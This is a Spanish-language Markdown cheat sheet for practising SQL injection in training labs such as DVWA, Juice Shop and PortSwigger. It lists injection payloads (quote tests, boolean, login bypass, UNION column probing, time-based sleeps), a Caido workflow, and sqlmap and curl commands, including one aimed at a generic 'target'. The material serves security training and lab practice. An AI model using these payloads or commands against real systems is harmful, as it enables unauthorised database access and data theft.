<div align="center">

# 💉 SQL Injection
### Detección, Confirmación y Explotación en Labs

</div>

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | SQL Injection, SQL Injection (Blind) |
| **Juice Shop** | Login Admin, Login Jim, Login Bender, Database Schema |
| **PortSwigger** | SQL injection learning path |

---

## 🛠️ Herramientas

- **Caido**: `HTTP History`, `Replay`, `Automate`
- `sqlmap`
- `curl`
- `jq`

---

## 🔍 Indicadores

- error SQL en response
- cambio de contenido con comilla simple
- bypass de login
- diferencia por booleanos
- retraso temporal
- union con columnas válidas

---

## 🧪 Payloads Base

### Confirmación rápida

```text
'
"
') 
'--
'#
```

### Boolean-based

```text
' AND 1=1-- -
' AND 1=2-- -
' OR '1'='1-- -
```

### Login bypass

```text
admin'-- -
' OR 1=1-- -
' OR '1'='1-- -
```

### UNION

```text
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### Time-based

```text
' AND SLEEP(5)-- -
'; WAITFOR DELAY '0:0:5'-- -
'||(SELECT pg_sleep(5))-- -
```

---

## 🔁 Flujo con Caido

### `[01]` Capturar request

Buscar:

- filtros `category`
- `search`
- `id`
- `product`
- `username/password`
- cookies raras

### `[02]` Replay

Probar:

```text
'
' AND 1=1-- -
' AND 1=2-- -
```

### `[03]` Automatizar

Mandar a `Automate`:

- placeholder en parámetro vulnerable
- lista simple:

```text
'
' AND 1=1-- -
' AND 1=2-- -
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

### `[04]` Extraer comportamiento

Comparar:

- status
- length
- palabras clave
- tiempo de respuesta

---

## ⚙️ Comandos Útiles

### sqlmap

```bash
sqlmap -u "http://dvwa.local/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch

sqlmap -u "http://target/search?q=test" -p q --batch --dbs

sqlmap -r request.txt --batch --level 3 --risk 2

sqlmap -r request.txt -p id --technique=BEUSTQ --batch
```

### curl

```bash
curl -i "http://dvwa.local/vulnerabilities/sqli/?id=1'&Submit=Submit#"
curl -i "http://dvwa.local/vulnerabilities/sqli/?id=1'+AND+1=1--+-&Submit=Submit#"
```

---

## 🧠 Casos Típicos

| Caso | Qué mirar |
|------|-----------|
| **WHERE clause** | contenido cambia con booleanos |
| **Login** | respuesta 302 / sesión creada |
| **UNION** | número de columnas y columnas texto |
| **Blind boolean** | palabras `Welcome`, `Invalid`, tamaños |
| **Blind time** | delta estable en segundos |
| **OOB** | DNS/HTTP callback en infraestructura controlada |

---

## 🧭 Ruta de Práctica

1. DVWA SQLi básico
2. DVWA SQLi Blind
3. PortSwigger: hidden data
4. PortSwigger: login bypass
5. PortSwigger: UNION / columnas
6. PortSwigger: boolean blind
7. PortSwigger: time-based
8. Juice Shop: retos de login

---

## 📝 Checklist

- input controlado identificado
- comportamiento diferencial validado
- DBMS inferido
- técnica elegida: error / union / blind / time
- evidencia guardada en Caido
- reproducido solo en lab
